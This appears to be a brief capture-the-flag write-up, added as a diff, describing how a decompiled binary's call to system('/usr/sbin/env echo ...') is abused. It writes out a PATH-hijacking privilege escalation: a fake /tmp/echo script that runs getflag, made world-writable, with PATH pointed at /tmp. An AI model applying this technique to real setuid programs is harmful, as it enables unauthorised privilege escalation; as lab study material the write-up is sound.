@@ -1,0 +1,9 @@
+We have a file binary we use dogbolt to decompiler the file.
+We can see this line
+system("/usr/sbin/env echo Exploit me")
+Change echo with getflag 
+for that we open a file /tmp/echo/
+with:
+#!/bin/bash
+/bin/getflag
+chmod 777 /tmp/echo And change the PATH=/tmp/
